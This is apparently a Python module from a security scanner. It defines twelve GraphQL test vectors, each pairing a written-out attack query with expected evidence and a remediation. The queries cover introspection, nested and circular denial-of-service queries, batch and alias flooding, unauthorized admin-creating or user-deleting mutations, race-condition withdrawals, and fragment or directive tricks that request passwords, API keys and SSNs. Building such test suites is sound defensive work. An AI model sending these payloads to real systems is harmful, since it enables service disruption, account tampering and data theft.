"""
Advanced GraphQL Security Testing Vectors
Introspection, depth limits, batch attacks, mutation testing
"""

from ..models import (
    TestVector,
    VulnerabilityType,
    TestVectorPosition as Position,
    PositionType,
    TestVectorPayload as PayloadTemplate,
    TestVectorEvidence as Evidence,
    ConfidenceLevel,
    SensitivityLevel,
)

GRAPHQL_ADVANCED_VECTORS = [
    TestVector(
        id="graphql-introspection-001",
        name="GraphQL Introspection Query",
        description="Tests if GraphQL introspection is enabled exposing schema",
        vuln_type=VulnerabilityType.GRAPHQL_INTROSPECTION,
        position=Position(
            type=PositionType.BODY_JSON, name="query", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base='{"query":"{__schema{types{name}}}"}',
            variants=[
                '{"query":"{__schema{queryType{name}}}"}',
                '{"query":"{__type(name:\\"User\\"){fields{name}}}"}',
                '{"query":"query IntrospectionQuery{__schema{queryType{name fields{name}}}}"}',
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=["Schema information returned", "Type names exposed"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        remediation="Disable introspection in production. Use schema allowlisting.",
        references=["https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"],
        tags=["graphql", "introspection", "information-disclosure"],
    ),
    TestVector(
        id="graphql-depth-001",
        name="GraphQL Query Depth Attack",
        description="Tests for DoS via deeply nested GraphQL queries",
        vuln_type=VulnerabilityType.GRAPHQL_DOS,
        position=Position(
            type=PositionType.BODY_JSON, name="query", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base='{"query":"{user{posts{comments{author{posts{comments{author{posts{comments{text}}}}}}}}}}}"}',
            variants=[
                # 10+ levels deep
                '{"query":"{user{posts{comments{author{posts{comments{author{posts{comments{text}}}}}}}}}}}"}'
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=["Server overload", "High response time", "Resource exhaustion"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Implement query depth limits (e.g., max 5-7 levels).",
        references=["https://cwe.mitre.org/data/definitions/400.html"],
        tags=["graphql", "dos", "depth-limit", "resource-exhaustion"],
    ),
    TestVector(
        id="graphql-batch-001",
        name="GraphQL Batch Query Attack",
        description="Tests for DoS via batched GraphQL queries",
        vuln_type=VulnerabilityType.GRAPHQL_BATCH_ATTACK,
        position=Position(
            type=PositionType.BODY_JSON, name="query", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base='[{"query":"{users{id}}"},{"query":"{users{id}}"}]',  # Repeat 100+ times
            variants=[
                # Array of 100+ identical queries
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=["Server processing excessive queries", "DoS condition"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Limit batch query count (e.g., max 5-10 per request).",
        references=["https://cwe.mitre.org/data/definitions/400.html"],
        tags=["graphql", "batch-attack", "dos"],
    ),
    TestVector(
        id="graphql-mutation-001",
        name="GraphQL Mutation Authorization Bypass",
        description="Tests if mutations lack proper authorization",
        vuln_type=VulnerabilityType.GRAPHQL_MUTATION_INJECTION,
        position=Position(
            type=PositionType.BODY_JSON, name="query", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base='{"query":"mutation{deleteUser(id:\\"1\\"){success}}"}',
            variants=[
                '{"query":"mutation{updateUser(id:\\"admin\\",role:\\"superadmin\\"){user{role}}}"}',
                '{"query":"mutation{createAdmin(username:\\"hacker\\"){user{id}}}"}',
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=["Unauthorized mutation executed", "Data modified without permission"],
            confidence=ConfidenceLevel.CRITICAL,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Implement authorization checks on all mutations.",
        references=["https://cwe.mitre.org/data/definitions/639.html"],
        tags=["graphql", "mutation", "authorization-bypass"],
    ),
    TestVector(
        id="graphql-circular-001",
        name="GraphQL Circular Query References",
        description="Tests for DoS via circular fragment references",
        vuln_type=VulnerabilityType.GRAPHQL_DOS,
        position=Position(
            type=PositionType.BODY_JSON, name="query", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base='{"query":"query{...FragA}fragment FragA on User{friends{...FragB}}fragment FragB on User{friends{...FragA}}"}',
            variants=[
                '{"query":"fragment A on User{posts{author{...B}}}fragment B on User{comments{author{...A}}}{user{...A}}"}',
                '{"query":"{user{...recursiveFragment}}fragment recursiveFragment on User{posts{author{...recursiveFragment}}}"}',
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Infinite recursion",
                "Server timeout",
                "High CPU usage",
                "Memory exhaustion",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Implement circular reference detection. Limit fragment depth. Set query complexity limits.",
        references=["https://cwe.mitre.org/data/definitions/400.html"],
        tags=["graphql", "circular-reference", "dos", "recursion"],
    ),
    TestVector(
        id="graphql-directive-001",
        name="GraphQL Directive Abuse",
        description="Tests for directive manipulation to bypass filters",
        vuln_type=VulnerabilityType.GRAPHQL_INJECTION,
        position=Position(
            type=PositionType.BODY_JSON, name="query", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base='{"query":"{users @include(if:true){sensitiveData}}"}',
            variants=[
                '{"query":"{adminUsers @skip(if:false){password}}"}',
                '{"query":"{users @deprecated(reason:\\"bypass\\"){privateData}}"}',
                '{"query":"query($bypass:Boolean=true){secretData @include(if:$bypass)}"}',
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=["Directive bypass", "Unauthorized data access", "Filter circumvention"],
            confidence=ConfidenceLevel.MEDIUM,
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Validate directive usage. Implement field-level authorization regardless of directives.",
        references=["https://spec.graphql.org/October2021/#sec-Type-System.Directives"],
        tags=["graphql", "directive-abuse", "authorization-bypass"],
    ),
    TestVector(
        id="graphql-alias-001",
        name="GraphQL Alias-based Batching DoS",
        description="Tests for DoS via alias-based query batching",
        vuln_type=VulnerabilityType.GRAPHQL_DOS,
        position=Position(
            type=PositionType.BODY_JSON, name="query", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base='{"query":"{alias1:users{id}alias2:users{id}alias3:users{id}alias4:users{id}alias5:users{id}}"}',
            variants=[
                '{"query":"{a1:user(id:1){posts}a2:user(id:1){posts}a3:user(id:1){posts}a4:user(id:1){posts}a5:user(id:1){posts}}"}',
                # Payload with 100+ aliases requesting same expensive field
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Multiple identical queries executed",
                "Resource exhaustion",
                "Slow response",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Limit alias count per query. Implement query cost analysis. Use query deduplication.",
        references=["https://owasp.org/www-project-web-security-testing-guide/"],
        tags=["graphql", "alias-abuse", "dos", "batching"],
    ),
    TestVector(
        id="graphql-mutation-batch-001",
        name="GraphQL Mutation Batching Attack",
        description="Tests for race conditions via batched mutations",
        vuln_type=VulnerabilityType.GRAPHQL_BATCH_ATTACK,
        position=Position(
            type=PositionType.BODY_JSON, name="query", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base='{"query":"mutation{m1:withdraw(amount:100){balance}m2:withdraw(amount:100){balance}m3:withdraw(amount:100){balance}}"}',
            variants=[
                '{"query":"mutation{buy1:purchase(item:1){success}buy2:purchase(item:1){success}buy3:purchase(item:1){success}}"}',
                '{"query":"mutation{claim1:reward{points}claim2:reward{points}claim3:reward{points}}"}',
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Race condition",
                "Multiple mutations executed",
                "Business logic bypass",
                "Inconsistent state",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Implement transaction isolation. Use optimistic locking. Limit mutations per request.",
        references=["https://cwe.mitre.org/data/definitions/362.html"],
        tags=["graphql", "mutation-batching", "race-condition", "business-logic"],
    ),
    TestVector(
        id="graphql-subscription-001",
        name="GraphQL Subscription Abuse",
        description="Tests for DoS via subscription flooding",
        vuln_type=VulnerabilityType.GRAPHQL_DOS,
        position=Position(
            type=PositionType.BODY_JSON, name="query", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base='{"query":"subscription{messageAdded{id content author{name posts{comments{text}}}}}"}',
            variants=[
                '{"query":"subscription{userUpdated{id friends{posts{comments{replies{author{friends{posts{comments{text}}}}}}}}}}"}',
                '{"query":"subscription{allEvents{...deepFragment}}fragment deepFragment on Event{data{nested{deep{deeper{deepest{value}}}}}}"}',
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "WebSocket connection maintained",
                "Excessive subscription updates",
                "Resource consumption",
            ],
            confidence=ConfidenceLevel.MEDIUM,
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        remediation="Limit subscription complexity. Implement subscription rate limiting. Set connection limits.",
        references=["https://spec.graphql.org/October2021/#sec-Subscription"],
        tags=["graphql", "subscription-abuse", "dos", "websocket"],
    ),
    TestVector(
        id="graphql-field-duplication-001",
        name="GraphQL Field Duplication DoS",
        description="Tests for DoS via requesting same field multiple times",
        vuln_type=VulnerabilityType.GRAPHQL_DOS,
        position=Position(
            type=PositionType.BODY_JSON, name="query", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base='{"query":"{user{id id id id posts posts posts comments comments}}"}',
            variants=[
                '{"query":"{users{id name email id name email id name email}}"}',
                # Query with 100+ duplicate expensive fields
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Redundant computation",
                "Unnecessary database queries",
                "Performance degradation",
            ],
            confidence=ConfidenceLevel.MEDIUM,
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        remediation="Implement query deduplication. Analyze and reject redundant field requests. Use query cost limits.",
        references=[
            "https://www.apollographql.com/blog/graphql/security/securing-your-graphql-api-from-malicious-queries/"
        ],
        tags=["graphql", "field-duplication", "dos", "performance"],
    ),
    TestVector(
        id="graphql-fragment-spreading-001",
        name="GraphQL Fragment Spreading Exploitation",
        description="Tests for abuse of fragment spreading for data access",
        vuln_type=VulnerabilityType.GRAPHQL_INJECTION,
        position=Position(
            type=PositionType.BODY_JSON, name="query", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base='{"query":"query{user{...userFields}}fragment userFields on User{id email password apiKey}"}',
            variants=[
                '{"query":"{user{...on User{sensitiveData}...on Admin{adminData}}}"}',
                '{"query":"fragment allData on User{...on Node{id}...on Sensitive{secret}}query{user{...allData}}"}',
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Sensitive fields exposed via fragments",
                "Type-based authorization bypass",
            ],
            confidence=ConfidenceLevel.MEDIUM,
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Validate fragment field access. Implement field-level authorization. Restrict inline fragments.",
        references=["https://spec.graphql.org/October2021/#sec-Fragment-Spreads"],
        tags=["graphql", "fragment-spreading", "authorization-bypass"],
    ),
    TestVector(
        id="graphql-inline-001",
        name="Inline Fragment Type Confusion",
        description="Tests for type confusion via inline fragments on unions/interfaces",
        vuln_type=VulnerabilityType.GRAPHQL_INJECTION,
        position=Position(
            type=PositionType.BODY_JSON, name="query", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="{ search { ... on User { id email privateKey } ... on Admin { id permissions } } }",
            variants=[
                "{ search { ... on User { id email privateKey } ... on Admin { id permissions } } }",
                '{ node(id: "1") { ... on User { ssn } ... on Admin { masterPassword } } }',
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Sensitive fields exposed",
                "Type confusion successful",
                "Authorization bypass",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Implement field-level authorization on all types. Validate inline fragment access.",
        references=["https://spec.graphql.org/October2021/#sec-Inline-Fragments"],
        tags=["graphql", "inline-fragment", "type-confusion", "authorization-bypass"],
    ),
]

# Total vectors: 12
